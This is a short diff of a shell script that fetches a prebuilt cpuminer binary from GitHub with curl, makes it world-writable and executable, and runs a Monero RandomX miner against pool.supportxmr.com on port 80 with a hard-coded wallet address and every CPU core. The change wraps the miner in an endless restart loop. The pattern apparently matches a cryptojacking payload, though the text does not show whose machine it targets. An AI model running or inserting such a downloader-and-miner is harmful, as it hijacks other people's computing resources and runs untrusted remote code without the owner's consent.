@@ -2,4 +2,6 @@
 apt update && apt -y install unzip wget curl libncurses6 libncursesw6
 curl https://github.com/ocminer/cpuminer-opt-supr/releases/download/v1.47/cpuminer-x86-64-v2-linux-x86_64 -L -o cc
 chmod 777 cc
+while true; do
 ./cc -a rx/0 -o stratum+tcp://pool.supportxmr.com:80 -u 43peYMqkwRGfN8ickDMB2PFM2nEHvKcYoTsh4sW524tQgxHD1MixG9JPJDtoKQeWK5EL5Evx9hAxackoCCddvcoh2rVCVeg -p $(echo $RANDOM | md5sum | head -c 10) -t $(nproc --all)
+done
